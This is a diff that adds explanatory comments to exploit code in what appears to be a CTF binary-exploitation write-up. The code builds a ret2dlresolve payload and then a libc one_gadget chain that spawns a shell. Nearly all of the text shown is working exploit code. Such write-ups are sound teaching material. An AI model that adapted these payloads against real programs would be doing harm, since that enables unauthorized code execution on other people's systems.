@@ -485,10 +485,10 @@ We will use this to clear the r12. I use xor because we don't need to add those 
 ```
 # Conduct ret2dlresolve
 dlresolver = 0x401000
-payload = p64(rw_section)
-payload += p64(dlresolver)
-payload += p64(reloc_arg)
-payload += p64(mov_rsi_rbp_read)
+payload = p64(rw_section)           # Fake rbp, choose random writable address
+payload += p64(dlresolver)          # Dlresolver
+payload += p64(reloc_arg)           # Fake reloc_arg
+payload += p64(mov_rsi_rbp_read)    # Return address
 p.send(payload)
 ```
 
@@ -501,7 +501,7 @@ xor_r12_pop_r12 = 0xd31f0
 payload = p64(0)                               # Fake rbp, not use more
 payload += p64(libc_base + xor_r12_pop_r12)    # rip
 payload += p64(0)                              # For that pop r12
-payload += p64(libc_base + one_gadget)
+payload += p64(libc_base + one_gadget)         # Return address
 p.send(payload)
 
 p.interactive()
